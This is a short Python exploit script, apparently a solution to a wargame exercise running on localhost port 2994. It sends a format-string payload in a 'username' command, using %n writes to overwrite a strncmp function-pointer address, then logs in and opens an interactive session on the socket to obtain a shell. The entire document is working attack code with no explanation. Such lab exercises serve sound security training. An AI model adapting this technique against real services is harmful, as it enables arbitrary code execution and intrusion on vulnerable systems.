import struct
import socket
import telnetlib

s = socket.socket()
s.connect(("127.0.0.1", 2994))

STRNCMP = struct.pack("<I", 0x804a1a8)
STRNCMP_2 = struct.pack("<I", 0x804a1a8+2)

print (s.recv(1024))
s.sendall("username " + 'Q' + STRNCMP + STRNCMP_2 + '%65416x%15$n' + '%47164x%16$n' + '\n')
s.sendall("login " + 'CCCC' + '\n')
print (s.recv(1024))

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
